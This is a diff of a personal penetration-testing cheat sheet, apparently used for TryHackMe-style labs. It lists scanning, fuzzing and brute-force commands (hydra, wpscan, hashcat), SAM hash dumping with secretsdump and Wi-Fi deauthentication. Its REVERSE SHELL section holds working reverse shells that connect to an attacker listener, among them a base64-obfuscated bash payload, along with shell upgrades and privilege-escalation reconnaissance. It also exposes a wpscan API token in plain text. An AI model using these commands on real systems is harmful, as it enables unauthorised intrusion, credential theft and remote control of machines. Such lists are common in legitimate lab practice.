@@ -8,34 +8,40 @@ WIFI:
 	sudo aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30
 TOOLS:
 	nmap -sS --open -sV -Pn -T4 -vvv <IP-адрес>
-	ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc all -c -v -fc 404 -u http://10.81.180.85/FUZZ 
+	ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc all -c -v -u http://10.81.180.85/FUZZ 
 	hydra -L userlist -P passlist protocol://address -vvv  
-	hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.82.132.253 http-form-post '/admin/:user=^USER^&pass=^PASS^:Username or password invalid' -vvv
+	hydra -l admin -P /usr/share/wordlists/rockyou.txt lookup.thm  http-form-post -vvv '/login.php/:username=^USER^&password=^PASS^:Wrong password'
 	katana -u https://10.81.185.232 -j | grep "THM"
 	binwalk -e filename
 	hashcat -m <hash type> <file storing your hash> <path to wordlist>
-	rdesktop -u username -p password IP
 	stegseek image wordlist
 	zbarimg image.png
 	java -jar /bin/stegsolve.jar
 	john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-	rpcinfo -p 10.80.140.153
-	showmount -e 10.80.140.153
 	wpscan --url http://10.82.184.231/ -e u -P /usr/share/wordlists/rockyou.txt --api-token iOZsJVBaHaDImXmUt3UwABIudk56HsYWWIkIZWCGDEY
 	subfinder -d example.com
 	webanalyze -hosts domains1.txt  -update > technologies.txt
 	cat domains1.txt | getallurls | grep '=' >> all_parameters.txt
 	nuclei -target http://example.com
+	rpcinfo -p 10.80.140.153
+	showmount -e 10.80.140.153
+	rdesktop -u username -p password IP
+	smbclient -L //10.82.130.53
+	python3 secretsdump.py -sam sam.save -system system.save LOCAL
+
 REVERSE SHELL:
-	/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.130.31/4444 0>&1"
+	/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.130.31/4441 0>&1"
 	nc 192.168.130.31 4444 -e /bin/bash
-	rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.130.36 4444 > /tmp/f
-	X=$(echo "YmFzaAo=" | base64 -d); echo "L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMzAuMzYvNDQ0NCAwPiYxIgo" | base64 -d | $X
+	rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.130.31 4444 > /tmp/f
+	X=$(echo "YmFzaAo=" | base64 -d); echo "L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMzAuMzEvNDQ0NCAwPiYxIgo=" | base64 -d | $X
+	
 REVERSE SHELL UPGRADE:
 	stty raw -echo && fg
 	stty rows $x columns $y
+	rlwrap nc -lvnp 4444
 	python3 -c 'import pty; pty.spawn("/bin/bash")'
 	export SHELL=bash; export TERM=xterm-256color; bash -i
+
 PRIVILEGE ESCALATION:
 	id
 	cat /etc/crontab
@@ -46,11 +52,13 @@ PRIVILEGE ESCALATION:
 	ss -tulpn
 	find / -type f -executable -group users 2>/dev/null
 	ps aux
+	systemctl | grep running
+	Get-WmiObject -Class Win32_Product
 	
 OTHER:
 	ssh-keygen -f <compromised_user>
 	sudo tcpdump -i tun0 icmp
-	sudo nc -l -p 4444
+	nc -lvnp 4444
 	mysql -u root -p
 	/usr/share/exploitdb/exploits/
 
